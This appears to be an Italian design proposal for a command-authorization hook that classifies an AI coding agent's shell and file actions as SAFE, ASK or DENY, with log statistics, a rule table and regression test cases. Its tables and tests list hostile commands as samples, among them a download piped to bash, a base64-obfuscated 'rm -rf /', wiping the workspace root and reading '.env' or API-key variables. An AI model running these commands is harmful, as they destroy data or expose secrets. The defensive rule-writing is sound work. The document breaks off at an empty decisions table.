# PROPOSTA — Authorization Judge v2 (classificazione SAFE / ASK / DENY context-aware)

> **Stato: SOLO PROPOSTA — nessun file di hook/policy/settings è stato modificato.**
> Autore: chief-architect · Data: 2026-07-07
> Fonti: `~/.claude/hooks/authorization_judge.py`, `~/.claude/hooks/auth_common.py`,
> `~/.claude/authorization_policy.json`, `~/.claude/settings.json`,
> `~/.claude/authorization_log.jsonl` (4032 righe, 2026-06-18 → 2026-07-07),
> `.claude/settings.local.json`, `C:\AI-LAB\CLAUDE.md`, `memory/MEMORY.md`,
> `memory/policy-workspace-autoallow.md`.

---

## A. Diagnosi

### A.1 Come decide oggi il Judge

Pipeline attuale (hook `PreToolUse` su `Bash|Edit|Write|MultiEdit|NotebookEdit`):

1. **File tools**: eccezione memory-md → `never_learn` (file protetti) → allow se dentro
   `C:\AI-LAB` → learned → ask (`file-outside`).
2. **Bash**: credenziali (0a) → read-only per segmento (0b, `safe_allow_patterns`) →
   `deny_block` → `never_learn` (kill, push, rm -rf, schema DB…) → cache giudice →
   `safe_delete` (`_tmp_`) → learned → `ask_force` (dipendenze, curl/wget, clone) →
   **6b workspace-allow** (cwd dentro `bash_autoallow_roots`) → **giudice IA**
   (subprocess `claude -p`, modello Haiku, timeout 40 s) → fallback ask.

I punti deboli strutturali emersi dall'analisi:

- **Split dei segmenti cieco alle quote**: `re.split(r"&&|\|\||;|\|", norm)` spezza anche
  dentro le stringhe quotate. Un `grep -n "neondatabase\|drizzle-kit" package.json` viene
  spezzato sul `\|` interno alla pattern-string → il "segmento" `drizzle-kit"...` matcha il
  pattern never_learn ancorato a inizio segmento → ASK su una ricerca testo (FP osservato
  2026-07-05 17:47).
- **Classificazione tutto-o-niente**: un comando composito è read-only solo se TUTTI i
  segmenti sono in `safe_allow`. Basta un `npx vitest run` (non in safe_allow) perché il
  `curl http://localhost:5000` dello stesso comando venga valutato dal pattern `ask_force`
  nudo `\b(curl|wget)\b` → ASK, nonostante la policy abbia già un pattern che riconosce
  il curl-verso-localhost come sicuro (ma solo nel ramo read-only).
- **Pattern credential `.env` context-blind**: scatta sulla PRESENZA della stringa `.env`
  (es. `git add .gitignore …` con messaggio/percorsi che citano `.env`), non sull'accesso
  reale al contenuto del file. 6 ASK su 8 della categoria `credential` sono comandi
  `git add`/`git commit` di metadati, non letture di segreti.
- **Giudice IA costoso e non deterministico**: 638 invocazioni totali (~16% delle
  decisioni pre), di cui **575 allow** che potevano essere regole deterministiche; 8 esiti
  sono fallback per timeout/risposta non interpretabile; lo stesso comando
  (`python tools/catalog_db.py`) ha ricevuto verdetti e motivazioni diverse in giorni
  diversi. Inoltre il giudice IA ha emesso **DENY "per forma"** (cd concatenato) su comandi
  innocui: la dottrina CLAUDE.md dice "riscrivi", non "blocca".
- **Scratchpad di sessione non riconosciuto**: la directory temporanea ufficiale
  (`%LOCALAPPDATA%\Temp\claude\<progetto>\<sessione>\scratchpad`) è "fuori workspace" →
  ogni Write/python lì dentro genera ASK (9 dei 13 `file-outside` + 3 ASK ai-judge).
- **Il selftest sporca il log**: la batteria di test del 2026-07-04 (17:05:56-58) ha
  registrato ~15 ASK sintetici (`rm -rf x`, `git push origin main`, `npm install lodash`,
  `cat .env`, `taskkill /F /PID 123`…) nel log di produzione, falsando le statistiche.

### A.2 Numeri dal log (intero storico, 4032 righe)

| Decisione | Conteggio | % sulle decisioni |
|---|---|---|
| allow | 3656 | 94.1% |
| **ask** | **213** | **5.5%** |
| deny | 16 | 0.4% |

Sorgenti delle decisioni (pre): `file-workspace` 2433 · `ai-judge` 575 allow + 54 ask +
9 deny · `safe-allow` 399 · `bash-workspace` 86 · `cache` 80 · `memory-md` 75 ·
`file-protected` 84 ask · `never-learn` 29 ask · `ask-force` 25 ask · `file-outside`
13 ask · `credential` 8 ask · `deny-block` 7 · `safe-delete` 4 · `learned` 4.

Trend: giugno 145 ask / 2507 allow — luglio 68 ask / 1151 allow. L'auto-allow di
workspace (6b, 2026-07-04) ha già ridotto molto; **dal 2026-07-04 restano 41 ask in 3
giorni**, così composti:

| Categoria ask (dal 04/07) | n | Natura |
|---|---|---|
| ask-force (curl localhost in comandi compositi) | 9 | **falso positivo** |
| ask-force (npm install) | 2 | legittimo |
| credential (`.env` come stringa in git add/commit/ls) | 6 | **falso positivo** |
| credential (`cat .env`, selftest) | 1 | legittimo (sintetico) |
| never-learn (grep di parole DB dentro stringhe quotate) | 2 | **falso positivo** |
| never-learn (db:push reale, taskkill, git push, rm -rf — in parte selftest) | 8 | legittimo |
| file-protected (edit policy/hook/settings — by design) | 8 | legittimo |
| ai-judge (rm sorgente progetto, ls ~/.claude, git add -A) | 3 | 2 FP / 1 legittimo |
| deny ai-judge (`rm -f C:/Windows/_tmp_x`) | 1 | legittimo |

**Top 10 comandi/target per frequenza di ASK (storico completo):**

| # | Target | n | Valutazione |
|---|---|---|---|
| 1 | Write `~/.claude/authorization_policy.json` | 24 | by design (file protetto) |
| 2 | Write `~/.claude/hooks/authorization_judge.py` | 9 | by design |
| 3 | Write/python nello **scratchpad di sessione** | 9+ | **FP** (dir temporanea ufficiale) |
| 4 | Write `~/.claude/hooks/auth_common.py` | 5 | by design |
| 5 | Edit `.claude/agents/*.md` di altri progetti | 5+ | FP parziale (config progetto) |
| 6 | `curl http://localhost:5000/...` in comandi compositi | ~13 | **FP** (rete solo locale) |
| 7 | `git add`/`git commit` contenenti la stringa `.env` | 6 | **FP** (metadati, non lettura segreti) |
| 8 | catene `python tools/validate.py && index_build && catalog_db` (KB) | ~8 | **FP** (tool di progetto whitelistabili) |
| 9 | `npm install …` | 6 | legittimo (nuova dipendenza) |
| 10 | grep/ricerche testo con parole DB/drizzle-kit dentro quote | ~6 | **FP** (dati, non azioni) |

**Stima falsi positivi**: escludendo gli 84 `file-protected` (by design) e ~20 voci
sintetiche del selftest, le ASK "reali" viste dall'utente sono ≈ 110; di queste ≈ 60-70
erano innocue → **FP ≈ 55-65% dello storico**. Sul periodo recente (post 6b): 17 FP su
~33 ask reali ≈ **50%**. Le classi FP residue sono poche e ben identificate:
(1) curl/rete solo-locale dentro comandi compositi, (2) stringa `.env` come dato in
comandi git, (3) parole sensibili dentro stringhe quotate, (4) scratchpad di sessione,
(5) DENY "per forma" del giudice IA.

Costo collaterale non-ASK: 575 allow decisi dal giudice IA = 575 subprocess `claude -p`
(secondi di latenza l'uno, più timeout occasionali) che regole deterministiche
eliminerebbero quasi del tutto (cache hit: solo 80).

---

## B. Modello di classificazione proposto

### B.1 Principi

1. **Default-ASK per l'ignoto**: nessuna regola matcha → ASK con motivazione
   "non classificato". Il giudice IA non è più il fallback obbligatorio (v. G-1).
2. **SAFE solo per**: lettura/diagnostica/test/build/lint, git read-only, operazioni
   ordinarie su file **dentro** `C:\AI-LAB\<progetto>` o dentro lo **scratchpad di
   sessione**, rete **solo-localhost**, cancellazione circoscritta di `_tmp_`.
3. **ASK per**: nuove dipendenze, rete non-locale, git push, DB/schema, kill processi,
   scritture fuori workspace+scratchpad, cancellazioni ricorsive/wildcard anche dentro
   il workspace, accesso reale a credenziali, file protetti (policy/hook/settings).
4. **DENY per**: distruttivi di sistema (rm -rf /, format, dd, fork bomb), download
   piped in shell, offuscamento (base64→shell, iex(iwr…)), distruttivi fuori workspace.
5. **La classificazione considera COMANDO + CONTESTO**: cwd effettivo, path target
   estratti (dentro/fuori workspace/scratchpad), host di rete estratti (locale/remoto),
   flag pericolosi (-rf, -Recurse, /s, --force), concatenazioni.
6. **Mai DENY per sola forma**: le violazioni di forma (cd concatenato, heredoc) si
   classificano nel tier che spetta all'AZIONE; la riscrittura in forma conforme è
   compito dell'agente (CLAUDE.md), non dell'hook.

### B.2 Cambi architetturali (deterministici, testabili)

- **P1 — Tokenizzazione quote-aware**: prima dello split in segmenti, sostituire le
  stringhe quotate ('…' e "…") con placeholder neutri (`ⓠn`). Lo split su
  `&&`/`||`/`;`/`|` e il matching dei pattern d'azione avvengono sul comando "sguscia to";
  i contenuti quotati sono DATI e non attivano mai pattern d'azione (attivano ancora i
  pattern credenziali quando sono path-argomento, v. P4). Elimina le classi FP (2) e (3).
- **P2 — Classificazione per segmento + max-severity**: ogni segmento riceve il proprio
  tier; il tier del comando = max(severità dei segmenti), con DENY > ASK > SAFE.
  Sostituisce il "tutto read-only o niente": `npx vitest run | tail && curl localhost:5000`
  = SAFE+SAFE → SAFE; `npm test && git push` = SAFE+ASK → ASK.
- **P3 — Contesto path**: da ogni segmento si estraggono i path argomento; un'operazione
  di scrittura/cancellazione è SAFE solo se TUTTI i path scrivibili ricadono in
  workspace-progetto o scratchpad. `cd <path> && cmd`: si calcola il **cwd effettivo**
  (il path del cd) e si classifica `cmd` con quel contesto — niente più DENY per forma.
- **P4 — Credenziali per AZIONE+TARGET**: il pattern `.env`/chiavi scatta solo quando il
  file credenziale è ARGOMENTO di un comando che ne legge/scrive/copia il contenuto
  (cat/type/get-content/cp/mv/tee/source/redirect) o di `git add`/`git checkout` con
  `.env` tra i path espliciti oppure `git add -A`/`.` con un `.env` reale non ignorato
  (verifica opzionale, v. G-5). Citare `.env` in un messaggio di commit o in una stringa
  quotata non scatta.
- **P5 — Rete per host estratti**: da curl/wget/iwr/Invoke-WebRequest/gh si estraggono
  gli host: tutti in {localhost, 127.0.0.1, ::1, [::1]} → SAFE; almeno uno remoto → ASK;
  pipe verso shell → DENY. Vale a livello di segmento (P2).
- **P6 — Scratchpad root fidato**: `%LOCALAPPDATA%\Temp\claude\<slug>\<sessione>\scratchpad`
  (e in generale `…\Temp\claude\…`) diventa root fidato per read/write/exec/delete al pari
  del workspace di progetto.
- **P7 — Giudice IA ridimensionato**: le regole deterministiche coprono la quasi totalità
  dei casi; per il residuo, default-ASK. Il giudice IA resta opzionale in modalità
  "advisory": può solo proporre allow (mai deny), timeout ridotto (10 s), cache attiva.
  Scelta finale all'utente (G-1).
- **P8 — Igiene del log**: il selftest scrive su `authorization_log_selftest.jsonl`
  (variabile d'ambiente nell'hook), così le statistiche di produzione restano pulite.
- **P9 — Invariati**: apprendimento (promozione dopo 2 approvazioni, mai per
  never-learn), eccezione memory-md, protezione assoluta di policy/hook/settings,
  fail-closed (qualsiasi errore → mai auto-approvare).

Ordine di valutazione v2 (per comando, dopo P1):
`DENY (D-\*)` → `credenziali/protetti (A-8/A-9)` → `never-learn ASK (A-4/A-5/A-6/A-10)` →
`SAFE (S-\*, per segmento con max-severity)` → `learned` → `ASK espliciti (A-1/A-2/A-3/A-7)` →
`default ASK (A-11)`.

---

## C. Tabella regole

Legenda contesto: `WS` = path/cwd dentro `C:\AI-LAB\<progetto>`; `SP` = dentro lo
scratchpad di sessione; `LOCAL` = host solo localhost/127.0.0.1/::1. I pattern sono
indicativi (regex definitive in fase di implementazione, sul comando quote-neutralizzato).

### Tier SAFE

| ID | Pattern (azione) | Condizioni di contesto | Razionale | Matcha (esempio) | NON matcha (esempio) |
|---|---|---|---|---|---|
| S1 | segmento read-only: `ls dir pwd cat type head tail wc grep rg find awk cut sort uniq jq diff git status/log/diff/show/branch/blame/ls-files…` | nessuna redirezione `>` verso file reale; niente `find -delete/-exec` | sola lettura, nessun effetto | `grep -rn "drizzle-kit" package.json` (parola quotata = dato, P1) | `find . -name x -delete` (→ A-10) |
| S2 | comando ordinario non classificato altrove: `git add/commit`, `mkdir/mv/cp`, `node/tsx/python <script>`, `npm run dev/start/check`, `rm -f <singolo file>` | cwd effettivo (anche via `cd`, P3) ∈ WS; nessun path scrivibile fuori WS∪SP | autonomia piena nel workspace (decisione utente 2026-07-04) | `git add -A && git commit -m "fix"` in FinancialWatchdog | stesso comando con cwd `C:\Users\rosar` (→ A-7/A-11) |
| S3 | Edit/Write/MultiEdit/NotebookEdit | `file_path` ∈ WS e non protetto (A-8) | già in vigore (`file-workspace`) | Write `C:\AI-LAB\FinancialWatchdog\server\routes.ts` | Write `C:\AI-LAB\FinancialWatchdog\.env` (→ A-8) |
| S4 | Edit/Write su `~/.claude/projects/<p>/memory/*.md` | solo `.md` in quella cartella; mai se protected | eccezione memory già dottrinale | Write `…\projects\C--AI-LAB-FinancialWatchdog\memory\MEMORY.md` | Write `~\.claude\settings.json` (→ A-8) |
| S5 | `rm [-f] / remove-item / del` di UN file `_tmp_*` | path singolo ∈ WS; no wildcard/`-r`/concatenazioni | safe-delete già dottrinale (CLAUDE.md) | `rm -f C:\AI-LAB\FinancialWatchdog\_tmp_devlog.txt` | `rm -f _tmp_*.txt` (wildcard → A-10) |
| S6 | qualsiasi read/write/exec/delete | tutti i path ∈ SP (scratchpad di sessione) | è la dir temporanea UFFICIALE degli agenti | `python "<scratchpad>\analyze.py"`, Write `<scratchpad>\out.json` | `python C:\Users\rosar\script.py` (→ A-11) |
| S7 | `curl/wget/iwr/invoke-webrequest` | TUTTI gli URL/host del segmento LOCAL; niente pipe verso shell | verifica di servizi locali (dev server, Ollama) = diagnostica | `curl -s http://localhost:5000/api/health` anche dentro comandi compositi | `curl https://example.com` (→ A-2) |
| S8 | `npm (run) test/lint/build/check/typecheck/format`, `npx vitest/eslint/tsc`, `pytest`, `dotnet build/test`, `flutter analyze/test/build` | cwd effettivo ∈ WS | verifiche/build = ciclo ordinario | `npm run check 2>&1 \| tail -3; npx vitest run` | `npm run db:push` (→ A-4) |
| S9 | `git` read-only ovunque; `git add/commit/-c user.\*` , `git fetch/stash list/tag -l` | per add/commit: cwd o `-C <path>` ∈ WS; nessun path credenziale reale tra gli argomenti espliciti (P4) | commit locale = reversibile, dentro il perimetro | `git -C C:\AI-LAB\FinancialWatchdog -c user.email=… commit -m "msg su .env"` | `git push` (→ A-3), `git add ..\fuori\x` (→ A-7) |
| S10 | assegnazioni shell semplici `VAR=...`, `echo/printf` senza redirect su file | il valore non matcha pattern credenziale (P4) | glue innocuo dei comandi compositi | `B=http://localhost:5000` | `export API_KEY=abc123…` (→ A-9) |

### Tier ASK

| ID | Pattern (azione) | Condizioni di contesto | Razionale | Matcha | NON matcha |
|---|---|---|---|---|---|
| A-1 | `npm install/i/add`, `pip install`, `cargo add`, `yarn/pnpm add`, `apt/brew/choco/winget install`, `dotnet add` | sempre (mai promuovibile) | stop-condition "nuova dipendenza" | `npm install lodash` | `npm ci` se l'utente decide diversamente (G-3) |
| A-2 | rete verso host NON locali: curl/wget/iwr/`gh api`/`git clone <remote>`/`docker pull` | almeno un host remoto estratto (P5) | stop-condition "servizio esterno" | `gh api repos/... `, `curl https://api.finnhub.io` | `curl localhost:5000` (→ S7) |
| A-3 | `git push` (non force), `git pull/merge da remoto con conflitti? no: pull resta S? v. G-4` | sempre; `git push --force*` v. D/G-4 | pubblicazione verso remoto | `git push origin main` | `git commit` (→ S9) |
| A-4 | schema/migrazioni DB: invocazione reale di `drizzle-kit`, `npm run db:push/db:migrate`, `prisma migrate/db push` | ancorata a inizio segmento o dopo `npx/npm run` (post-P1 le stringhe quotate non scattano) | stop-condition "schema DB" | `npm run db:push` | `grep "db:push" package.json` (→ S1) |
| A-5 | client DB e SQL mutante: `psql/mysql/sqlite3/mongosh/redis-cli…`, `insert/update/delete/drop/truncate/alter` | ASK sempre se non-locale o distruttivo; SQL SELECT-only su DB locale può restare apprendibile | protezione dati reali | `psql … -c "delete from alerts"` | `grep -i "delete from" src/*.ts` (→ S1) |
| A-6 | kill processi: `taskkill`, `Stop-Process`, `Stop-Service`, `pkill/killall`, `kill <pid>` | sempre (mai promuovibile) | interrompe processi utente | `Stop-Process -Id 123` | `ps`, `Get-Process` (→ S1) |
| A-7 | scritture/cancellazioni con path FUORI da WS∪SP | tool file (`file-outside`) e Bash (mv/cp/rm/tee/redirect con target esterno) | perimetro di sicurezza | Write `C:\Users\rosar\Documents\x.md` | Write nello scratchpad (→ S6) |
| A-8 | file protetti: `.env` reali, `*.pem/id_rsa/...`, `~/.claude/settings*`, `authorization_*.py/json`, `.claude/settings.local.json` | sempre, mai promuovibile; vince su ogni SAFE | protegge la config di sicurezza stessa | Edit `authorization_policy.json` | `.env.example/.template/.sample` (→ S3) |
| A-9 | accesso a credenziali: lettura/stampa/export di file o variabili segrete | AZIONE+TARGET (P4): cat/cp/source/redirect su `.env`; `echo $TOKEN`; `export SECRET=…` | anti-esfiltrazione | `cat .env`, `printenv FINNHUB_API_KEY` | `git commit -m "docs: spiega .env"` (→ S9) |
| A-10 | cancellazioni ricorsive o wildcard ANCHE dentro il workspace: `rm -rf <dir>`, `rm *.ts`, `remove-item -recurse`, `del /s`, `git clean`, `find -delete` | dentro WS → ASK; fuori WS o su path di sistema → D-3 | distruttivo di massa ma talvolta legittimo (build/) | `rm -rf build` | `rm -f _tmp_x.txt` (→ S5) |
| A-11 | **default**: tutto ciò che nessuna regola classifica | — | default-ASK per l'ignoto | binario sconosciuto `foo --bar` fuori WS | — |

### Tier DENY

| ID | Pattern (azione) | Condizioni di contesto | Razionale | Matcha | NON matcha |
|---|---|---|---|---|---|
| D-1 | distruzione di sistema: `rm -rf /`~, `mkfs`, `format X:`, `dd if=`, fork bomb, `> /dev/sd*` | sempre | irreversibile, fuori da ogni dubbio | `rm -rf /` | `rm -rf build` (→ A-10) |
| D-2 | download eseguito: `(curl\|wget\|iwr) … \| (sh\|bash\|python\|pwsh\|iex)` | sempre | esecuzione codice remoto | `curl … \| bash` | `curl localhost \| jq` (→ S7) |
| D-3 | cancellazione/scrittura distruttiva su path di sistema o radice workspace: `rm -rf C:\`, `C:\Windows`, `Program Files`, `C:\Users\<u>` interi, `rm … C:\AI-LAB\` (root) | path estratto (P3) su zona vietata | danno fuori perimetro | `rm -f C:\Windows\_tmp_x` | `rm -f C:\AI-LAB\proj\_tmp_x` (→ S5) |
| D-4 | offuscamento: `base64 -d \| sh`, `echo <blob> \| bash`, `iex(iwr …)`, `Invoke-Expression` su contenuto dinamico | sempre | elusione del classificatore | `echo cm0gLXJmIC8= \| base64 -d \| sh` | heredoc verso `python -` per analisi read-only (→ tier dell'azione; forma sconsigliata ma non DENY) |
| D-5 | `git push --force/--force-with-lease` su branch condivisi, `git push --delete` | default DENY; declassabile ad ASK su scelta utente (G-4) | riscrittura storia remota | `git push --force origin main` | `git push origin feature` (→ A-3) |

Totale: **10 SAFE · 11 ASK · 5 DENY**.

---

## D. Esempi svolti (dal log, vecchia vs nuova classificazione)

| # | Comando (reale, dal log) | Oggi | v2 | Regola | Nota |
|---|---|---|---|---|---|
| 1 | `curl -s -o /dev/null -w "%{http_code}" http://localhost:5000/ ; tail -5 …` | ASK (ask-force) | **SAFE** | S7+S1 | **FP eliminato** — rete solo locale |
| 2 | `npx vitest run 2>&1 \| tail -6; curl -s … http://localhost:5000/` | ASK (ask-force) | **SAFE** | S8+S7 | **FP eliminato** — max-severity per segmento |
| 3 | `cd C:/AI-LAB/FinancialWatchdog && for i in …; do curl -s http://localhost:5000/api/settings …` | ASK (ask-force) | **SAFE** | P3+S7 | **FP eliminato** — cwd effettivo nel workspace |
| 4 | `git -C C:/AI-LAB/FinancialWatchdog -c user.email=… commit -m "…"` (citava `.env`) | ASK (credential) | **SAFE** | S9+P4 | **FP eliminato** — `.env` era dato, non lettura |
| 5 | `git add package.json … .gitignore .env.example` | ASK (credential) | **SAFE** | S9 | **FP eliminato** — nessun `.env` reale tra i path |
| 6 | `cat .env` | ASK (credential) | **ASK** | A-9 | invariato, corretto (esfiltrazione) |
| 7 | `cd …FinancialWatchdog && grep -rn "userId" server/routes.ts …; grep -n "neondatabase\\\|drizzle-kit" package.json` | ASK (never-learn: `drizzle-kit`) | **SAFE** | P1+S1 | **FP eliminato** — parola dentro stringa quotata |
| 8 | `python --version … python -c "import importlib;[print(m,'OK' …)]"` (check moduli) | ASK (db_non_local) | **SAFE** | P1+S2 | **FP eliminato** — nomi modulo erano dati |
| 9 | `npm run db:push` | ASK (never-learn) | **ASK** | A-4 | invariato — stop-condition schema DB |
| 10 | `DATABASE_URL='postgres://…' npm run db:push` | ASK | **ASK** | A-4(+A-9) | invariato, corretto |
| 11 | `npm install lodash` / `npm install -D vitest eslint …` | ASK (ask-force) | **ASK** | A-1 | invariato — nuova dipendenza |
| 12 | `taskkill /F /PID 123` · `Stop-Process -Id 123` | ASK (never-learn) | **ASK** | A-6 | invariato |
| 13 | `git push origin main` | ASK (never-learn) | **ASK** | A-3 | invariato |
| 14 | `rm -rf build` | ASK (never-learn) | **ASK** | A-10 | invariato — massivo ma nel progetto |
| 15 | `rm -rf /` | DENY | **DENY** | D-1 | invariato |
| 16 | `rm -f C:/Windows/_tmp_x` | DENY (ai-judge) | **DENY** | D-3 | invariato, ora deterministico |
| 17 | Write `…\Temp\claude\C--AI-LAB-PIAR-Consulting\<sess>\scratchpad\analyze_…py` | ASK (file-outside) | **SAFE** | S6 | **FP eliminato** — scratchpad ufficiale |
| 18 | `python "<scratchpad>\q_legacy.py"` | ASK (ai-judge) | **SAFE** | S6 | **FP eliminato** |
| 19 | `curl -s http://localhost:11434/api/generate -d '{…}'` (Ollama locale) | DENY (ai-judge) | **SAFE** | S7 | **FP eliminato** — host locale, POST locale è diagnostica |
| 20 | `cd "C:/AI-LAB/PIAR-Consulting" && python tools/source_status.py --check \| tail -6` | DENY (ai-judge, "forma") | **SAFE** | P3+S2 | **FP eliminato** — mai DENY per forma |
| 21 | `mkdir -p knowledge_inbox/_staging/WF01-MM-CH18-P1` (cwd nel progetto) | ASK (ai-judge) | **SAFE** | S2 | **FP eliminato** (oggi in parte coperto da 6b) |
| 22 | `git add -A` (cwd nel progetto) | ASK (ai-judge) | **SAFE** | S9 | FP eliminato; opzione paranoid in G-5 |
| 23 | `rm client/src/lib/legacy.ts legacyAlertApi.ts && npm run check` | ASK (ai-judge) | **SAFE** | S2 | coerente con autonomia workspace 2026-07-04 (2 file espliciti, no wildcard) |
| 24 | `python C:\Users\rosar\.claude\hooks\_selftest.py` | ASK (ai-judge) | **ASK** | A-11/A-8 | invariato — area config fuori workspace |
| 25 | `gh api repos/…/contents --jq '.[].name'` | ASK (ai-judge) | **ASK** | A-2 | invariato (salvo decisione G-2) |
| 26 | `rm -f C:\AI-LAB\FinancialWatchdog\_tmp_devlog.txt` | allow (safe-delete) | **SAFE** | S5 | invariato |

Effetto atteso sul periodo recente: delle 41 ASK post-2026-07-04, ~17 sarebbero state
SAFE (FP eliminati), 0 nuove SAFE indebite; il giudice IA sarebbe stato invocato ~0 volte
al posto di 33 (29 allow + 3 ask + 1 deny).

---

## E. Self-test (suite di regressione del Judge)

### E.1 Formato

File casi: `~/.claude/hooks/authorization_cases.jsonl` — una riga JSON per caso:

```json
{"name": "curl-localhost-composito", "input": {"tool_name": "Bash", "tool_input": {"command": "npx vitest run 2>&1 | tail -6; curl -s -o /dev/null -w '%{http_code}' http://localhost:5000/"}, "cwd": "C:\\AI-LAB\\FinancialWatchdog"}, "expect": {"decision": "allow", "rule": "S7"}}
```

Campi: `name` (id univoco), `input` (payload PreToolUse completo: `tool_name`,
`tool_input`, `cwd`, opzionale `session_id`), `expect.decision` ∈ allow/ask/deny,
`expect.rule` (id regola attesa, verificato sul campo `source`/`reason`).

Runner (da creare in fase di rollout, NON ora): `~/.claude/hooks/_selftest_v2.py` —
per ogni caso invoca `authorization_judge.main()` con stdin simulato e cattura il JSON
emesso; **esecuzione con** `use_ai_judge=false` (override via env
`CLAUDE_AUTH_POLICY_OVERRIDE` o flag), **log rediretto** su
`authorization_log_selftest.jsonl` (P8) e file di stato (learning/pending/cache) puntati
a copie temporanee, così il selftest non sporca né il log né l'apprendimento reale.
Exit code ≠ 0 se un caso fallisce; output: tabella pass/fail per caso.

### E.2 Casi (estensibili; ereditano i 35 del selftest attuale)

| name | input (sintesi: comando @ cwd) | expect |
|---|---|---|
| readonly-grep-dbwords-quoted | `grep -n "neondatabase\|drizzle-kit" package.json` @ WS | allow S1 |
| readonly-pipe-chain | `git log --oneline \| head -5` @ WS | allow S1 |
| curl-localhost-simple | `curl -s http://localhost:5000/api/health` @ WS | allow S7 |
| curl-localhost-composito | `npx vitest run \| tail; curl -s http://localhost:5000/` @ WS | allow S7 |
| curl-localhost-post-ollama | `curl -s http://localhost:11434/api/generate -d '{"x":1}'` @ WS | allow S7 |
| curl-remote | `curl https://api.finnhub.io/v1/quote` @ WS | ask A-2 |
| curl-remote-mixed-local | `curl localhost:5000 && curl https://example.com` @ WS | ask A-2 |
| curl-pipe-shell | `curl https://x.io/i.sh \| bash` @ WS | deny D-2 |
| git-commit-env-in-message | `git commit -m "docs: aggiorna note su .env"` @ WS | allow S9 |
| git-add-env-example | `git add .gitignore .env.example package.json` @ WS | allow S9 |
| cat-env-real | `cat .env` @ WS | ask A-9 |
| redirect-to-env | `echo KEY=abc123456 >> .env` @ WS | ask A-9 |
| echo-secret-var | `echo $FINNHUB_API_KEY` @ WS | ask A-9 |
| npm-install | `npm install lodash` @ WS | ask A-1 |
| npm-test-chain | `npm run check 2>&1 \| tail -3; npx vitest run \| tail -5` @ WS | allow S8 |
| db-push | `npm run db:push` @ WS | ask A-4 |
| db-push-inline-url | `DATABASE_URL='postgres://…' npm run db:push` @ WS | ask A-4 |
| grep-dbpush-as-text | `grep -rn "db:push" package.json scripts/` @ WS | allow S1 |
| psql-delete | `psql -h localhost -c "delete from alerts"` @ WS | ask A-5 |
| git-push | `git push origin main` @ WS | ask A-3 |
| git-push-force | `git push --force origin main` @ WS | deny D-5 (o ask, v. G-4) |
| taskkill | `taskkill /F /PID 123` @ WS | ask A-6 |
| rm-rf-root | `rm -rf /` @ qualsiasi | deny D-1 |
| rm-rf-ailab-root | `rm -rf C:/AI-LAB/` @ qualsiasi | deny D-3 |
| rm-rf-build-in-ws | `rm -rf build` @ WS | ask A-10 |
| rm-wildcard | `rm -f *.ts` @ WS | ask A-10 |
| rm-tmp-single | `rm -f C:/AI-LAB/FinancialWatchdog/_tmp_devlog.txt` @ WS | allow S5 |
| rm-single-source-ws | `rm client/src/lib/legacy.ts` @ WS | allow S2 |
| rm-outside-tmp | `rm -f C:/Windows/_tmp_x` @ WS | deny D-3 |
| cd-ws-then-tool | `cd "C:/AI-LAB/PIAR-Consulting" && python tools/source_status.py --check \| tail -6` @ altro | allow S2 (P3) |
| cd-outside-then-read | `cd /c/Users/rosar/.claude/projects/X && head -1 t.jsonl` @ WS | ask A-7/A-11 |
| write-scratchpad | Write `…\Temp\claude\<slug>\<sess>\scratchpad\out.json` | allow S6 |
| exec-scratchpad | `python "<scratchpad>\analyze.py"` @ WS | allow S6 |
| write-outside | Write `C:\Users\rosar\Documents\x.md` | ask A-7 |
| write-policy | Write `~\.claude\authorization_policy.json` | ask A-8 |
| write-settings-local | Write `C:\AI-LAB\FinancialWatchdog\.claude\settings.local.json` | ask A-8 |
| write-memory-md | Write `~\.claude\projects\C--AI-LAB-FinancialWatchdog\memory\MEMORY.md` | allow S4 |
| var-assign-benign | `B=http://localhost:5000` @ WS | allow S10 |
| export-secret | `export API_KEY=abcdef123456` @ WS | ask A-9 |
| base64-pipe-shell | `echo cm0gLXJmIC8= \| base64 -d \| sh` @ WS | deny D-4 |
| unknown-binary-outside | `foo --bar` @ `C:\Users\rosar` | ask A-11 |
| git-add-all-ws | `git add -A` @ WS | allow S9 (o ask, v. G-5) |

Criterio di accettazione della suite: 100% pass; ogni FP documentato in §D deve avere
un caso che lo copra; ogni regola D-\* e A-8/A-9 deve avere almeno un caso positivo e
uno negativo.

---

## F. Piano di rollout (dopo conferma utente)

1. **Backup versionato**: copia datata di `authorization_policy.json`,
   `authorization_judge.py`, `auth_common.py` (es. `~/.claude/hooks/backup/<data>/…`) —
   prerequisito del rollback. (Valutare git-init di `~/.claude`, v. G-8.)
2. **Implementazione** — in QUESTO ordine e con **una sola Write per file protetto**
   (regola appresa 2026-07-04, 1 prompt per file invece di N):
   a. `auth_common.py`: tokenizzatore quote-aware (P1), estrazione path/host (P3/P5),
      classificazione per segmento (P2), riconoscimento scratchpad (P6).
   b. `authorization_policy.json`: nuove chiavi (`scratchpad_roots`,
      `local_hosts`, pattern rivisti per A-9 azione+target, spostamento curl-localhost
      da ask_force a regola SAFE segmentale, `selftest_log_file`).
   c. `authorization_judge.py`: nuovo ordine di valutazione, rimozione/demotion giudice
      IA secondo la decisione G-1, mai-DENY-per-forma.
3. **Test**: creare `authorization_cases.jsonl` (§E.2, ~42 casi) + `_selftest_v2.py`;
   eseguire; integrare i 35 casi esistenti; 100% pass richiesto. Verificare che il
   selftest non scriva su `authorization_log.jsonl` (P8).
4. **Canary (2-3 giorni)**: lavoro normale su FinancialWatchdog; a fine giornata,
   rileggere il log: (a) elenco ASK residue e loro fondatezza; (b) elenco SAFE emesse
   dalle regole nuove (S6/S7/S9/P1) per audit a campione; (c) zero invocazioni giudice
   IA impreviste.
5. **Osservazione (2 settimane)**: metriche settimanali da log: n. ASK reali/settimana
   (target: < 5, sole stop-condition), FP (target: ~0), n. DENY errati (target: 0
   assoluto), latenza media (attesa in forte calo senza subprocess IA).
6. **Criteri di rollback** (ripristino immediato del backup, un solo prompt):
   - una decisione SAFE che avrebbe dovuto essere ASK/DENY (regressione di sicurezza)
     → rollback immediato e post-mortem del caso nella suite;
   - crash/eccezioni dell'hook (il fail-closed protegge, ma degrada l'esperienza);
   - aumento anomalo di ASK (regola scritta male).
7. **Chiusura**: aggiornare `memory/policy-workspace-autoallow.md` (o nuova nota
   `policy-judge-v2.md`), `Docs/CHANGELOG_DECISIONS.md`, `Docs/WORK_LOG.md`.

---

## G. Decisioni aperte per l'utente (blocco consolidato)

| # | Decisione | Opzioni | Raccomandazione |
|---|---|---|---|
